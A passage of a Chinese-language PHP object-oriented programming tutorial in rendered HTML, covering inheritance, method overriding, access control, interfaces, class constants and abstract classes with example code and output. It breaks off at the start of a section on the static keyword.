class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行以上代码，输出结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">销毁 MyDestructableClass</span><br></pre></td></tr></table></figure><hr><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>PHP 使用关键字 <strong>extends</strong> 来继承一个类，PHP 不支持多继承，格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">   <span class="comment">// 代码部分</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="实例-5"><a href="#实例-5" class="headerlink" title="实例"></a>实例</h3><p>实例中 Child_Site 类继承了 Site 类，并扩展了功能：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 子类扩展站点类别</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child_Site</span> <span class="keyword">extends</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">   <span class="keyword">var</span> $category;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setCate</span><span class="params">($par)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;category = $par;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getCate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;category . PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h2><p>如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。</p><p>实例中重写了 getUrl 与 getTitle 方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url . PHP_EOL;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;url;</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTitle</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;title . PHP_EOL;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;title;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h2><p>PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。</p><ul><li><strong>public（公有）：</strong>公有的类成员可以在任何地方被访问。</li><li><strong>protected（受保护）：</strong>受保护的类成员则可以被其自身以及其子类和父类访问。</li><li><strong>private（私有）：</strong>私有的类成员则只能被其定义所在的类访问。</li></ul><h3 id="属性的访问控制"><a href="#属性的访问控制" class="headerlink" title="属性的访问控制"></a>属性的访问控制</h3><p>类属性必须定义为公有，受保护，私有之一。如果用 var 定义，则被视为公有。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Define MyClass</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $public = <span class="string">'Public'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $protected = <span class="string">'Protected'</span>;</span><br><span class="line">    <span class="keyword">private</span> $private = <span class="string">'Private'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">printHello</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;public;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;protected;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;private;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> MyClass();</span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;public; <span class="comment">// 这行能被正常执行</span></span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;protected; <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;private; <span class="comment">// 这行也会产生一个致命错误</span></span><br><span class="line">$obj-&gt;printHello(); <span class="comment">// 输出 Public、Protected 和 Private</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Define MyClass2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 可以对 public 和 protected 进行重定义，但 private 而不能</span></span><br><span class="line">    <span class="keyword">protected</span> $protected = <span class="string">'Protected2'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">printHello</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;public;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;protected;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;private;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj2 = <span class="keyword">new</span> MyClass2();</span><br><span class="line"><span class="keyword">echo</span> $obj2-&gt;public; <span class="comment">// 这行能被正常执行</span></span><br><span class="line"><span class="keyword">echo</span> $obj2-&gt;private; <span class="comment">// 未定义 private</span></span><br><span class="line"><span class="keyword">echo</span> $obj2-&gt;protected; <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line">$obj2-&gt;printHello(); <span class="comment">// 输出 Public、Protected2 和 Undefined</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="方法的访问控制"><a href="#方法的访问控制" class="headerlink" title="方法的访问控制"></a>方法的访问控制</h3><p>类中的方法可以被定义为公有，私有或受保护。如果没有设置这些关键字，则该方法默认为公有。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Define MyClass</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 声明一个公有的构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明一个公有的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">MyPublic</span><span class="params">()</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明一个受保护的方法</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">MyProtected</span><span class="params">()</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明一个私有的方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">MyPrivate</span><span class="params">()</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 此方法为公有</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;MyPublic();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;MyProtected();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;MyPrivate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$myclass = <span class="keyword">new</span> MyClass;</span><br><span class="line">$myclass-&gt;MyPublic(); <span class="comment">// 这行能被正常执行</span></span><br><span class="line">$myclass-&gt;MyProtected(); <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line">$myclass-&gt;MyPrivate(); <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line">$myclass-&gt;Foo(); <span class="comment">// 公有，受保护，私有都可以执行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Define MyClass2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 此方法为公有</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Foo2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;MyPublic();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;MyProtected();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;MyPrivate(); <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$myclass2 = <span class="keyword">new</span> MyClass2;</span><br><span class="line">$myclass2-&gt;MyPublic(); <span class="comment">// 这行能被正常执行</span></span><br><span class="line">$myclass2-&gt;Foo2(); <span class="comment">// 公有的和受保护的都可执行，但私有的不行</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bar</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;testPrivate();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;testPublic();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testPublic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Bar::testPublic\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">testPrivate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Bar::testPrivate\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">extends</span> <span class="title">Bar</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testPublic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Foo::testPublic\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">testPrivate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Foo::testPrivate\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$myFoo = <span class="keyword">new</span> foo();</span><br><span class="line">$myFoo-&gt;test(); <span class="comment">// Bar::testPrivate </span></span><br><span class="line">                <span class="comment">// Foo::testPublic</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>使用接口（interface），可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。</p><p>接口是通过 <strong>interface</strong> 关键字来定义的，就像定义一个标准的类一样，但其中定义所有的方法都是空的。</p><p>接口中定义的所有方法都必须是公有，这是接口的特性。</p><p>要实现一个接口，使用 <strong>implements</strong> 操作符。类中必须实现接口中定义的所有方法，否则会报一个致命错误。类可以实现多个接口，用逗号来分隔多个接口的名称。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个'iTemplate'接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">iTemplate</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setVariable</span><span class="params">($name, $var)</span></span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHtml</span><span class="params">($template)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> <span class="keyword">implements</span> <span class="title">iTemplate</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $vars = <span class="keyword">array</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setVariable</span><span class="params">($name, $var)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vars[$name] = $var;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHtml</span><span class="params">($template)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;vars <span class="keyword">as</span> $name =&gt; $value) &#123;</span><br><span class="line">            $template = str_replace(<span class="string">'&#123;'</span> . $name . <span class="string">'&#125;'</span>, $value, $template);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> $template;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>可以把在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用 $ 符号。</p><p>常量的值必须是一个定值，不能是变量，类属性，数学运算的结果或函数调用。</p><p>自 PHP 5.3.0 起，可以用一个变量来动态调用类。但该变量的值不能为关键字（如 self，parent 或 static）。</p><h3 id="实例-6"><a href="#实例-6" class="headerlink" title="实例"></a>实例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> constant = <span class="string">'常量值'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">showConstant</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="keyword">self</span>::constant . PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> MyClass::constant . PHP_EOL;</span><br><span class="line"></span><br><span class="line">$classname = <span class="string">"MyClass"</span>;</span><br><span class="line"><span class="keyword">echo</span> $classname::constant . PHP_EOL; <span class="comment">// 自 5.3.0 起</span></span><br><span class="line"></span><br><span class="line">$class = <span class="keyword">new</span> MyClass();</span><br><span class="line">$class-&gt;showConstant();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $class::constant . PHP_EOL; <span class="comment">// 自 PHP 5.3.0 起</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>任何一个类，如果它里面至少有一个方法是被声明为抽象的，那么这个类就必须被声明为抽象的。</p><p>定义为抽象的类不能被实例化。</p><p>被定义为抽象的方法只是声明了其调用方式（参数），不能定义其具体的功能实现。</p><p>继承一个抽象类的时候，子类必须定义父类中的所有抽象方法；另外，这些方法的访问控制必须和父类中一样（或者更为宽松）。例如某个抽象方法被声明为受保护的，那么子类中实现的方法就应该声明为受保护的或者公有的，而不能定义为私有的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="comment">// 强制要求子类定义这些方法</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">prefixValue</span><span class="params">($prefix)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 普通方法（非抽象方法）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printOut</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="keyword">$this</span>-&gt;getValue() . PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteClass1</span> <span class="keyword">extends</span> <span class="title">AbstractClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"ConcreteClass1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prefixValue</span><span class="params">($prefix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;$prefix&#125;ConcreteClass1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteClass2</span> <span class="keyword">extends</span> <span class="title">AbstractClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"ConcreteClass2"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prefixValue</span><span class="params">($prefix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;$prefix&#125;ConcreteClass2"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class1 = <span class="keyword">new</span> ConcreteClass1;</span><br><span class="line">$class1-&gt;printOut();</span><br><span class="line"><span class="keyword">echo</span> $class1-&gt;prefixValue(<span class="string">'FOO_'</span>) . PHP_EOL;</span><br><span class="line"></span><br><span class="line">$class2 = <span class="keyword">new</span> ConcreteClass2;</span><br><span class="line">$class2-&gt;printOut();</span><br><span class="line"><span class="keyword">echo</span> $class2-&gt;prefixValue(<span class="string">'FOO_'</span>) . PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行以上代码，输出结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ConcreteClass1</span><br><span class="line">FOO_ConcreteClass1</span><br><span class="line">ConcreteClass2</span><br><span class="line">FOO_ConcreteClass2</span><br></pre></td></tr></table></figure><p>此外，子类方法可以包含父类抽象方法中不存在的可选参数。</p><p>例如，子类定义了一个可选参数，而父类抽象方法的声明里没有，则也是可以正常运行的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 我们的抽象方法仅需要定义需要的参数</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">prefixName</span><span class="params">($name)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteClass</span> <span class="keyword">extends</span> <span class="title">AbstractClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 我们的子类可以定义父类签名中不存在的可选参数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prefixName</span><span class="params">($name, $separator = <span class="string">"."</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($name == <span class="string">"Pacman"</span>) &#123;</span><br><span class="line">            $prefix = <span class="string">"Mr"</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($name == <span class="string">"Pacwoman"</span>) &#123;</span><br><span class="line">            $prefix = <span class="string">"Mrs"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $prefix = <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;$prefix&#125;&#123;$separator&#125; &#123;$name&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class = <span class="keyword">new</span> ConcreteClass;</span><br><span class="line"><span class="keyword">echo</span> $class-&gt;prefixName(<span class="string">"Pacman"</span>), <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $class-&gt;prefixName(<span class="string">"Pacwoman"</span>), <span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mr. Pacman</span><br><span class="line">Mrs. Pacwoman</span><br></pre></td></tr></table></figure><hr><h2 id="Static-关键字"><a href="#Static-关键字" class="headerlink" title="Static 关键字"></a>Static 关键字</h2><p>声明类属性或方法为 